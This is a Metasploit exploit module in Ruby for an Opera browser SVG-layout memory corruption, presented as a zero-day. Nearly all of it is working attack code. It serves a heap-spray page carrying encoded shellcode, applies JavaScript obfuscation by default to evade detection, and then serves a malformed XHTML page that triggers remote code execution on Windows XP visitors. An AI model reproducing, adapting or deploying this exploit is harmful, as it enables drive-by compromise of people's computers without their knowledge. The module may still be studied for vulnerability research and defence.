require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
     
    def initialize(info = {})
     
        super(update_info(info,
            'Name'           => 'Opera Browser 10/11/12 (SVG layout) Memory Corruption',
            'Description'    => %q{
             
                This module exploits a vulnerability in the bad nesting with SVG tags. Successfully exploiting
                leads to remote code execution or denial of service condition under Windows XP SP3 (DEP = off).
                Best results of reliability using Opera v12.00 pre-alpha r1076 whereas that v11.xx will have less
                success (depending of opera.dll version). This module won't work against v10.xx because it was
                modified to exploit Opera upper to v11.
                Read the lastest references for further details.
                 
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Jose A. Vazquez'
                ],
            'Version'        => '$Revision: 0011 $',
            'References'     =>
                [
                    ['URL', 'http://www.beyondsecurity.com/ssd.html'],
                    ['URL', 'http://spa-s3c.blogspot.com/2011/10/spas3c-sv-006opera-browser-101112-0-day.html'],    # English
                    ['URL', 'http://enred20.org/node/27']   # Spanish
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC'          => 'process',
                    'HTTP::compression' => 'gzip',
                    'HTTP::chunked'     => true
                },
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00",
                    'Compat'   =>
                        {
                            'ConnectionType' => '-find',
                        },
                    'StackAdjustment' => -3500
                },
            'Platform'       => 'win',
            'Targets'        =>
                [  
 
                    # spray of ~ 450 MB.
                     
                    [ 'Opera Browser (v11.xx - v12.00pre-alpha) / Windows XP SP3 (DEP-off)', 
                        {
                            'Method' => 'usual',
                            'MaxOffset' => nil,
                            'MaxSize' => nil,
                            'MaxBlocks' => 900,
                            'Ret' => 0x0c0c0c0c
                        }
                    ],
                     
                    # Thanks to sinn3r of metasploit.com for this method.
                     
                    [ 'Opera Browser (v11.xx) / Windows XP SP3 (DEP-off)', 
                        {
                            'Method' => 'precise-allocation-size',
                            'MaxOffset' => 0x800,
                            'MaxSize' => 0x80000,
                            'MaxBlocks' => 0x500,
                            'Ret' => 0x0c0c0c0c
                        }
                    ]
                ],
            'DisclosureDate' => '0day',
            'DefaultTarget'  => 0))
             
            #Apply obfuscation by default
             
            register_options(
            [
                OptBool.new('OBFUSCATE', [false, 'JavaScript obfuscation', true])
            ], self.class)
             
    end
     
    def on_request_uri(cli, request)
     
        mytarget = target
         
        if(request.uri =~ /\.xhtml$/)
         
            #Send file for trigger the vulnerability
         
                 
            html = %Q|
            <html xmlns="http://www.w3.org/1999/xhtml" xmlns:svt="http://www.w3.org/2000/svg">
                <head>
                    <meta http-equiv="refresh" content="0;url=" />
                </head>
                <select1 style = 'padding-bottom: 8711px;background-image: url("HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH");' >
                    <svt:svg>
                        <svt:title style = 'pointer-events: visiblePainted;font: normal small-caps 120%/120% fantasy;' >
                            <svt:svg>
                                <svt:font>
                                    <svt:animateMotion>
                                        feFuncR
                                    </svt:animateMotion>
                                </svt:font>
                            </svt:svg>
                        </svt:title>
                    </svt:svg>
                </select1>
            </html>
                |
         
            #Send triggerer
         
            print_status("Sending stage 2 (Triggering the vulnerability)")
            var_contentype = 'application/xhtml+xml'
             
        else
             
            #Sending init HTML
            print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (Method: #{mytarget['Method']} / Target: #{mytarget.name})")
             
            return if ((p = regenerate_payload(cli)) == nil)
             
            shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))
             
            addr_word  = [mytarget.ret].pack('V').unpack('H*')[0][0,4]
            var_timer_trigger   = (rand(3) + 2) * 1000
            var_file_trigger    =   rand_text_alpha(rand(30)+2)
             
            #Build the exploit
             
            var_url =  ((datastore['SSL']) ? "https://" : "http://")
            var_url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'])
            var_url << ":" + datastore['SRVPORT']
            var_url << get_resource
             
            #Choose the heap spray method
             
            if(mytarget['Method'] == 'usual')
             
                spray_js = <<-JS
                 
                var shell = unescape("#{shellcode}");
                var size = shell.length * 2;
                var nopsize = 0x100000 - (size + 0x14);
                var nopsled = unescape("%u#{addr_word}");
                 
                while(nopsled.length * 2 < nopsize) {
                    nopsled += nopsled;
                }
                 
                var blocks = new Array();
                 
                for (var x = 0; x < #{mytarget['MaxBlocks']}; x++) {
                    blocks[x] = nopsled + shell;
                }
                         
                function TriggerVuln(){
                    document.write("<iframe src='#{var_url}/#{var_file_trigger}.xhtml'></iframe>");
                }
                 
                JS
                 
            else
             
                #
                # Tested on Opera v11.5x but it's not working on Opera v12.00 pre-alpha
                 
                #
                #   /*
                #       *  Heap spray for Opera that uses VirtualAlloc
                #       *  Arguments:
                #       *  @blocks     - an emtpy array
                #       *  @code       - the payload
                #       *  @offset     - padding to align the code
                #       *  @chunk_max  - max size for each allocation
                #       *  @blocks_max - max blocks
                #   */
                #
                #
             
                spray_js = <<-JS
                 
                function heap_spray(blocks, code, offset, chunk_max, blocks_max) {
                    if (chunk_max < 0x7F000) {
                        throw "This function is meant for size 0x7F000 or higher to trigger VirtualAlloc";
                    }
                     
                    chunk_max /= 2;
                 
                    var nops = unescape("%u0c0c%u0c0c");
                    while (nops.length < chunk_max) nops += nops;
                 
                    var offset_chunk = nops.substr(0, offset-code.length);
                 
                    var block = offset_chunk + code + nops.substr(0, chunk_max-offset_chunk.length-code.length);
                 
                    while (block.length % 8 != 0) block += unescape("%u0c");
                 
                    var shellcode = block.substr(0, (chunk_max-0x1c)/2);
                 
                    for (var i=0; i < blocks_max; i++) {
                        blocks[i] = shellcode + unescape("%u0c0c");
                    }
                }
                 
                var blocks = new Array();
                var code = unescape("#{shellcode}");
                heap_spray(blocks, code, #{mytarget['MaxOffset']}, #{mytarget['MaxSize']}, #{mytarget['MaxBlocks']});
                 
                function TriggerVuln(){
                    document.write("<iframe src='#{var_url}/#{var_file_trigger}.xhtml'></iframe>");
                }
                 
                JS
             
            end
             
            if datastore['OBFUSCATE'] == true
                spray_js = ::Rex::Exploitation::JSObfu.new(spray_js)
                spray_js.obfuscate
                trigger_sym = spray_js.sym('TriggerVuln')
                spray_js = spray_js.to_s + "setTimeout('#{trigger_sym}()',#{var_timer_trigger});"
            else
                spray_js = spray_js.to_s + "setTimeout('TriggerVuln()',#{var_timer_trigger});"
            end
             
            html = %Q|
                    <html>
                        <head>
                            <script type="text/javascript">
                                #{spray_js}    
                            </script>
                        </head>
                    <html>
                |  
             
            print_status("Sending stage 1 (Spraying the heap)")
            var_contentype = 'text/html'
                 
        end
     
    #Response
    send_response(cli, html, { 'Content-Type' => var_contentype, 'Pragma' => 'no-cache' })
    #Handle the payload        
    handler(cli)
         
    end
     
end